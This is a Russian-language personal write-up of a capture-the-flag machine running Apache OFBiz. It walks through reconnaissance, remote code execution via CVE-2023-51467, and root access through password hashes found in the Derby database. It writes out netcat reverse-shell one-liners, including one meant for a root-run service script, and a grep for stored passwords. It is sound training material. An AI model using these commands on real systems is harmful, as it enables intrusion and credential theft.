Простоя машина на веб.

# Получение флага пользователя

## Этап разведки

Тут стандарно: 
1.  Используем[[Nmap | nmap]] чтобы найти открытые порты, находим стандартные веб-порты
2. Исследуем визуально сайт, в футоре сайта можно было заметить подсказку на технологию [[Apache OFBiz]]. Что могло дать подсказку о возможных путях исследования. (Успешно пропущено))) ).
3. Использование [[gobuster]] для перебора директорий. Стоит отметить, что в данном случае помогли флаги: 
	- -k - для отчключения проверки сертификата.
	- -b - для ингнорирования статусов кодов ответа
4. Нахождение [[URI | uri]] `{{host}}/control` Который выдавал ошибку, но при этом подсказал на технологию [[Apache OFBiz |OFBiz]].
5. Поиск информации по [[Apache OFBiz]] в открытых источниках. Нашел путь `{{host}}/webtools` который переводил на страницу авторизации. На которой была указана версия продука.
6. По версии продукта была найдена [[CVE]] и [[Эксплойт | эксплойт]] к ней, который привводил к 
   [[RCE]]. Эта уязвимость была под номером ***CVE-2023-51467***


## Этап эксплуатации

Перед эксплуатацией, надо было проверить, что эксплойт рабочий, в данном случае, в эксплойте был uri, который позволял проверить наличие уязвимости в продукте.

Сама эксплуатация из разряда скачал - запустил. Поэтому встраеваем в нагрузку [[Revershell (обратная оболочка) | обратную оболочку]]. И получаем доступ к системе.

> [!NOTE] На заметку
> С первого раза обратную оболочку запустить не получилось, команда просто не выполнялясь (наверное). Можно было подумать, что экслойт не рабочей. Но методом перебора была получена нужная нагрузка. 
> 
> ==На будующие:  Прежде чем окрестить эксплойт или технику нерабочей, нужно перебрать как можно больше нагрузок, ибо может на серверве не стоит нужных утилит==

После чего получаем флаг пользователя.

# Получение флага рута
## Этап повышения привелегий

На данной машине этот этап был  сложным, что пришлось прибегнуть к прохождению.

### То что пробовал я

По страндарту начал сбор информации по машине:
- sudo -l
- поиск [[SSH]] файлов
- Использование [[LinPEAS.sh]]

По LinePEAS.sh нашел интересную возможность, которая могла бы теоретически срабоать. Он показал, что можно изменять файл, который запускается с помощью [[systemctl]], сам файл представлял собой [[bash]] файл. Добавив туда, что-то вроде этого: 
```
nc 10.10.10.10 9001 -e sh& # Как варинат добвать еще цикл для продолжения попыток подключения
```

Важно было бы запускать его через `&`, чтобы запустить в фоновом режиме, а на своей машине запустить прослушивание порта, что в теори после перезагрузки машины, можно было получить права root. Так как сервисы запускаются от рута.

### По прохождению

[[Apache OFBiz]] в качестве базы данных использует [[Derby]]. Директорию с Derby я нашел самостоятельно по документации, но предлагают еще такой варинат:
`find / -type d -iname "derby" 2> /dev/null`

После я также нашел хранилилише данных, но там было большое количество файлов, а найти чувстивтельные данные в таком количестве, достаточно труднозатратно. Что использовали в прохожденни:
`find *.dat | xargs grep -a -i "password="` ищим совпадения внутри файлов.


> [!NOTE] На заметку
> Конструкции типа `strings * | grep ` оказались малоэффективными, по сравнению со способом указанным выше

Найдя файл с паролем, и сообствено пароль в захешированном виде,  просто через [[hashcat]] взломать его не получиться, так как он  еще дополнительно модифицировался + использовалась  [[Соль в криптографии | соль]]. Для взлома нужно было найти в исходном коде [[Apache OFBiz]] алгоритм хэширования. И увидить что там base64.


> [!NOTE] На заметку
> В целом если поискать, то есть скрипты которые ломали перебором этот хэш, и можно было не искать в исходном коде.

После получения пароля, можно было с помощью `su` зайти под рутом и получить флаг системы.

# Выводы  и полезные фишки

## Выводы
В целом процесс получения флага пользователя не был особо сложным.
Но повышение привелегий, друго дело, тут в целом можно добавить в методику анализа, что: 
1. Проверить наличиче базы данных у приложения, если она есть, то попробовать получить доступ к ней и поискать чувствительную информацию, например пароль
2. Порой необходимо заглянуть в исходный код, если приложение имеет открытый сходный код, если алгоритм хеширования отличается от стандартного.
3. Если алгоритм хеширование не стандартный, то попробовать найти скрипты для побора, возможно они существуют.

## Работа над ошибками

В целом необходимо чуть больше уделить вниманию криптографии, так как в целом с первого взгялада было не совсем понятно, что не так с хешем.

Изучить подробнее [[hashcat]], т.к как оказалось, он может принимать хэши без файла и с солью, тут было что-то вроде:
`hashcat -a 0 -m 120 <hash>:<salt> /path/to/wordlist`.

Также изучить способы быстрого поиска файлов, например по содержимому, подробнее изучить [[find]], [[xargs]], [[grep]]

Вообще также возможно имеет место, если не получается быстро найти вектор повышения привилегий, то может стоит начать с изучения приложения работающего на сервере, особенно если есть бд.

## Фишки

Узнал про интересный сайт [CyberChef](https://gchq.github.io/CyberChef/), который может пригодиться для быстрого преобразования данных.

Также я для улучшения терминала использую **pty**, вот еще один способ

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <Your_IP> 1337 >/tmp/f`

Прикольный способ, может даже дать более стабильную работу. Можно нажимать <Cntrl + D>, но не контрл + С. Также  работают команда clear.

